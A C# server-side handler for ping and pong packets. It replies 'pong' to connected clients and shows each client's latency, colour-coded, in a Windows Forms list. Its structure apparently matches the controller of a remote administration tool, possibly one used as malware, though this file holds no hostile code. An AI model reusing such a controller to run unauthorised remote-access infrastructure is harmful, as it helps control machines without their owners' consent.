using Server.MessagePack;
using Server.Connection;
using System.Diagnostics;
using System.Windows.Forms;
using System.Threading;
using System.Drawing;
using Microsoft.VisualBasic;

namespace Server.Handle_Packet
{
    public class HandlePing
    {
        public void Ping(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").SetAsString("pong");
                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    
            }
            catch { }
        }

        public void Pong(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                lock (Settings.LockListviewClients)
                    if (client.LV != null)
                    {
                        int interval = (int)unpack_msgpack.ForcePathObject("Message").AsInteger;
                        client.LV.SubItems[Program.form1.lv_Ping.Index].Text = interval + " MS";
                        if (interval > 400)
                        {
                            client.LV.SubItems[Program.form1.lv_Ping.Index].ForeColor = Color.Red;
                        }
                        else if (interval > 200)
                        {
                            client.LV.SubItems[Program.form1.lv_Ping.Index].ForeColor = Color.Orange;
                        }
                        else
                        {
                            client.LV.SubItems[Program.form1.lv_Ping.Index].ForeColor = Color.Green;
                        }
                    }

            }
            catch { }
        }
    }
}